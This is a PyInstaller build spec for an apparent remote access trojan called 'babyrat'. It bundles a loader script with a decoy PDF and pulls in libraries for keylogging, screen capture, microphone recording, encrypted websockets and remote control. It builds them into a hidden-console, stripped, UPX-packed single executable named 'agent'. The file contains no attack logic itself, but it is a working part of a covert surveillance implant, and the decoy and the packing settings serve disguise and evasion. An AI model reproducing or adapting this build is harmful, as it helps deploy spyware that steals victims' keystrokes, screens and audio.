# -*- mode: python ; coding: utf-8 -*-
a = Analysis(
    ['client_loader.py'],
    pathex=[],
    binaries=[],
    datas=[('C:\\Users\\bense\\Desktop\\babyrat\\babyrat-main\\decoy.pdf', '.')],
    hiddenimports=[
        'pkg_resources', 'email', 'email.mime', 'email.mime.text',
        'email.mime.base', 'email.mime.multipart', 'email.utils',
        'email.parser', 'email.message', 'asyncio', 'websockets', 'Crypto',
        'mss', 'PIL', 'PIL._tkinter_finder', 'pynput', 'pynput.keyboard',
        'pynput.mouse', 'pynput._util', 'pynput._util.win32',
        'sounddevice', 'numpy', 'pyaudio', 'queue', 'concurrent',
        'concurrent.futures'
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=2,
)
pyz = PYZ(a.pure)
exe = EXE(
    pyz, a.scripts, a.binaries, a.datas, [],
    name='agent',
    debug=False, bootloader_ignore_signals=False,
    strip=True, upx=True, upx_exclude=[],
    runtime_tmpdir=None,
    console=False, onefile=True,
    disable_windowed_traceback=True,
    argv_emulation=False,
    target_arch=None, codesign_identity=None, entitlements_file=None,
    
)
